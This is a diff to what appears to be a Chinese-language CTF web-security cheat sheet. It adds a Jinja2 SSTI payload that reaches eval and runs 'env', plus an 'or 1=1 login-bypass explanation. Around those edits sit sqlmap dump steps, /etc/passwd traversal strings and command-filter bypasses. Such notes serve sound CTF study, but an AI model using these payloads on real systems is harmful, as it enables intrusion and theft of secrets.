@@ -406,6 +406,18 @@ Windows Media (asf)，文件头(hex)：3026B2758E66CF11
 MIDI (mid)，文件头(hex)：4D546864
 </code></pre>
 <h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p><code>&#123;&#123;config.items()&#125;&#125;</code>- Jinja2引擎解析这个字符串时，它会返回一个包含所有配置项的列表<br><code>&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls ../').read() &#125;&#125;</code>读取系统文件<br><code>import os os.system(&#39;ls ../&#39;) os.system(&#39;cat ../flag&#39;)</code></p>
+<pre><code class="bash">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
+&#123;% if c.__name__ == 'catch_warnings' %&#125;
+  &#123;% for b in c.__init__.__globals__.values() %&#125;
+  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;
+    &#123;% if 'eval' in b.keys() %&#125;
+      &#123;&#123; b['eval']('__import__("os").popen("env").read()') &#125;&#125;
+    &#123;% endif %&#125;
+  &#123;% endif %&#125;
+  &#123;% endfor %&#125;
+&#123;% endif %&#125;
+&#123;% endfor %&#125;
+</code></pre>
 <h3 id="svn泄漏"><a href="#svn泄漏" class="headerlink" title="svn泄漏"></a>svn泄漏</h3><pre><code class="bash">工具：dvcs-ripper tree
 cd dvcs-ripper
 perl ./rip-svn.pl -v -u url/.svn/
@@ -494,7 +506,7 @@ tailf 类似于tail -f
 <li>过滤空格: <code>&lt;,&lt;&gt;,$&#123;IFS&#125;</code></li>
 <li>过滤运算分隔符号:<code>;-&gt;%0a</code> <code>file | base64-&gt; base64 file</code> <code>/-&gt;cd$&#123;IFS&#125;</code></li>
 </ul>
-<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><pre><code class="bash">1.sqlmap -u &quot;目标网址&quot; --dbs
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><pre><code class="bash">1.sqlmap -u &quot;目标网址/?id=1&quot; --dbs
 2.sqlmap -u &quot;目标网址&quot; -D [数据库名] --tables
 3.sqlmap -u &quot;目标网址&quot; -D [数据库名] -T [表名] --columns
 4.sqlmap -u &quot;目标网址&quot; -D [数据库名] -T [表名] -C [列名] --dump
@@ -533,6 +545,10 @@ equaltolike.py      -- 作用是用like代替等号
 apostrophemask.py   -- 作用是用utf8代替引号
 greatest.py         -- 作用是绕过过滤&#39;&gt;&#39; ,用GREATEST替换大于号
 </code></pre>
+<p>为什么<code>username=xxx&#39;or&#39;1=1&amp;password=xxx&#39;or&#39;1=1</code>可以达到SQL注入，从而直接输出表内容的目的。</p>
+<p>假设我们的表名叫<code>t_user</code>，<code>username</code>为用户名字段，<code>password</code>为密码字段，只有当用户名和密码字段都正确的时候才能输出该数据的内容</p>
+<p><code>SELECT * FROM t_user WHERE username = &#39;xxx&#39; AND password = &quot;xxxx&quot;</code><br>但是我们通过在xxx后面拼接一个’号来闭合<code>username</code>的值，然后通过<code>or 1 = 1</code>使where的条件恒等于true，上面的SQL也就变成了</p>
+<p><code>SELECT * FROM t_user WHERE username=&#39;xxx&#39;or 1 = 1 AND password=&#39;xxx&#39;or 1 = 1</code><br>从而可以查出所有的数据。</p>
 <h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><blockquote>
 <p>工具：蚁剑</p>
 </blockquote>
@@ -600,6 +616,21 @@ print(result)
 <li><code>?target=db_datadict.php%253f../../../../../../etc/passwd</code></li>
 <li><code>?target=db_datadict.php%253f../../../../../../flag</code><br>即可获取flag</li>
 </ul>
+<p>qs:<br>qs是负责url参数转换js库。</p>
+<p>简单用法：foo[bar]&#x3D;baz–&gt;</p>
+<pre><code class="bash">assert.deepEqual(qs.parse(&#39;foo[bar]=baz&#39;),&#123;
+    foo:&#123;
+      bar:&#39;baz&#39;
+    &#125;
+&#125;);
+#可嵌套对象
+#   foo:&#123;
+#     bar:&#123;
+#         baz：&#39;foobarbaz&#39;
+#     &#125;
+#   &#125;
+</code></pre>
+<p>url:a&#x3D;b&amp;proxy&#x3D;nginx–&gt;<br><code>&#123;a:&#39;b&#39;,proxy:&#39;nginx&#39;&#125;</code><br>qs最多解析1000个参数<br>所以<br>answer: <code>url/?a=1&amp;a=1.............</code></p>
 
     </div>
     
